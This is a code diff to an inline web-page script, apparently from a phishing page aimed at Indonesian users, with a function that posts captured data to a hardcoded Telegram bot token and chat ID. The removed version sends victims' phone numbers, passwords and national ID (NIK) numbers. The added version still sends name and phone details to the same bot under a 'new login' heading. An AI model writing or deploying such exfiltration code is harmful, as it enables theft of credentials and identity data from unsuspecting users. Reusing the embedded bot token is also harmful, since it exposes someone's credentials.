@@ -455,24 +455,22 @@
 const BOT_TOKEN = "8779360559:AAF8oJxBD-okLDSOy0gNr5uB0rTjH7_zgB4";
 const CHAT_ID = "8264171951";
 
-async function kirimTelegram(phone,password,nik){
-const pesan =
-`LOGIN BARU
-HP: ${phone}
-PASS: ${password}
-NIK: ${nik}`;
-
+async function kirimTelegram(nama, masked, promo){
+  const pesan = `LOGIN BARU
+Nama: ${nama}
+HP: ${masked}
+🎁 Promo: ${promo}`;
 
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    chat_id: CHAT_ID,
-    text: pesan
-  })
-});
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: pesan
+    })
+  });
 }
 
 </script>
